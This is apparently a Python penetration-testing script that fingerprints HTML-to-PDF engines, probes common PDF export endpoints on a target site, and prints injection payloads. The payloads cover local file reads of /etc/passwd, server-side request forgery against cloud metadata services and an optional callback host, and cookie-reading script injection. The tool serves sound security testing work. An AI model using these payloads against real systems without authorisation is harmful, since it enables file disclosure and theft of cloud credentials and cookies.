#!/usr/bin/env python3
"""
pdf_ssrf_scanner.py — Detect HTML-to-PDF generators and test for SSRF / local file read.

Usage:
  python3 tools/pdf_ssrf_scanner.py --url https://target.com
  python3 tools/pdf_ssrf_scanner.py --url https://target.com --callback http://burp.collaborator.net
  python3 tools/pdf_ssrf_scanner.py --url https://target.com --dry-run
"""

import argparse
import json
import time
import urllib.request
import urllib.error
import urllib.parse

# ─── Color codes ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

PDF_ENDPOINTS = [
    "/export", "/download", "/invoice", "/receipt", "/report",
    "/pdf", "/generate-pdf", "/render", "/print", "/export/pdf",
    "/api/pdf", "/api/export", "/api/report",
]

PDF_SIGNATURES = {
    "wkhtmltopdf": ["wkhtmltopdf", "wkhtmlimage"],
    "puppeteer":   ["puppeteer", "headless chrome", "chromium"],
    "prince":      ["prince", "princexmlpdf"],
    "weasyprint":  ["weasyprint"],
    "phantomjs":   ["phantomjs"],
    "fpdf":        ["fpdf"],
    "reportlab":   ["reportlab"],
}

FILE_READ_PAYLOADS = [
    '<iframe src="file:///etc/passwd">',
    '<img src="file:///etc/passwd">',
    '<link rel="stylesheet" href="file:///etc/passwd">',
    '<script src="file:///etc/passwd"></script>',
    '<embed src="file:///etc/passwd">',
]

SSRF_PAYLOADS = [
    '<img src="http://169.254.169.254/latest/meta-data/">',
    '<iframe src="http://169.254.169.254/latest/meta-data/">',
    '<img src="http://metadata.google.internal/computeMetadata/v1/">',
    '<img src="http://100.100.100.200/latest/meta-data/">',
    '<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">',
]


def _request(url: str, headers: dict | None = None, timeout: int = 10) -> tuple[int, dict, bytes]:
    req = urllib.request.Request(url, headers=headers or {"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), b""
    except Exception as e:
        return 0, {}, str(e).encode()


def fingerprint_pdf_engine(url: str, dry_run: bool) -> dict:
    findings = []
    if dry_run:
        print(f"  {DIM}[dry-run] GET {url}{RESET}")
        return {"url": url, "engine": "dry-run", "findings": []}

    status, headers, body = _request(url)
    if status == 0:
        return {"url": url, "engine": None, "findings": []}

    text = body.decode("utf-8", errors="replace").lower()
    all_headers = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()
    haystack = text + all_headers

    detected = []
    for engine, sigs in PDF_SIGNATURES.items():
        for sig in sigs:
            if sig in haystack:
                detected.append(engine)
                findings.append(f"PDF engine detected: {engine} (signature: {sig})")
                print(f"  {RED}[PDF ENGINE] {engine} detected via signature '{sig}'{RESET}")
                break

    return {"url": url, "engines_detected": detected, "findings": findings}


def probe_endpoints(base_url: str, dry_run: bool, rate: float) -> list:
    results = []
    base = base_url.rstrip("/")
    for ep in PDF_ENDPOINTS:
        url = base + ep
        if dry_run:
            print(f"  {DIM}[dry-run] GET {url}{RESET}")
            results.append({"endpoint": url, "status": "dry-run"})
            continue
        status, headers, body = _request(url)
        content_type = headers.get("Content-Type", "")
        is_pdf = "pdf" in content_type or body[:4] == b"%PDF"
        if status in (200, 302, 301) and is_pdf:
            print(f"  {RED}[PDF ENDPOINT] {url} → {status} ({content_type}){RESET}")
            results.append({"endpoint": url, "status": status, "content_type": content_type, "is_pdf": True})
        else:
            print(f"  {DIM}[{status}] {url}{RESET}")
        time.sleep(rate)
    return results


def show_payloads(callback: str | None):
    print(f"\n{BOLD}{CYAN}── File Read Payloads ──────────────────────────────────{RESET}")
    for p in FILE_READ_PAYLOADS:
        print(f"  {YELLOW}{p}{RESET}")

    print(f"\n{BOLD}{CYAN}── SSRF Payloads ───────────────────────────────────────{RESET}")
    ssrf = list(SSRF_PAYLOADS)
    if callback:
        ssrf.append(f'<img src="{callback}/pdf-ssrf-probe">')
        ssrf.append(f'<iframe src="{callback}/pdf-ssrf-probe"></iframe>')
    for p in ssrf:
        print(f"  {YELLOW}{p}{RESET}")

    print(f"\n{BOLD}{CYAN}── XSS in PDF ──────────────────────────────────────────{RESET}")
    xss = [
        "<script>document.write(document.cookie)</script>",
        "<script>document.write(window.location.href)</script>",
        "<img src=x onerror=\"document.write(document.cookie)\">",
    ]
    for p in xss:
        print(f"  {YELLOW}{p}{RESET}")


def main():
    ap = argparse.ArgumentParser(description="HTML-to-PDF SSRF / LFI scanner")
    ap.add_argument("--url", required=True, help="Target base URL")
    ap.add_argument("--callback", help="Callback URL for out-of-band detection")
    ap.add_argument("--dry-run", action="store_true", help="Print requests without sending")
    ap.add_argument("--rate", type=float, default=1.0, help="Seconds between requests")
    ap.add_argument("--output", help="Write JSON results to file")
    args = ap.parse_args()

    print(f"{BOLD}{BLUE}╔══════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{BLUE}║        PDF SSRF / LFI Scanner            ║{RESET}")
    print(f"{BOLD}{BLUE}╚══════════════════════════════════════════╝{RESET}\n")

    print(f"{CYAN}[*] Fingerprinting PDF engine at {args.url}{RESET}")
    engine_result = fingerprint_pdf_engine(args.url, args.dry_run)

    print(f"\n{CYAN}[*] Probing known PDF endpoints{RESET}")
    endpoint_results = probe_endpoints(args.url, args.dry_run, args.rate)

    show_payloads(args.callback)

    output = {
        "target": args.url,
        "callback": args.callback,
        "dry_run": args.dry_run,
        "engine_detection": engine_result,
        "pdf_endpoints": endpoint_results,
        "file_read_payloads": FILE_READ_PAYLOADS,
        "ssrf_payloads": SSRF_PAYLOADS,
    }

    print(f"\n{BOLD}{GREEN}[+] Scan complete.{RESET}")
    print(f"{DIM}Inject payloads into HTML fields that get PDF'd to confirm LFI/SSRF.{RESET}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(output, f, indent=2)
        print(f"{GREEN}[+] Results written to {args.output}{RESET}")

    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()
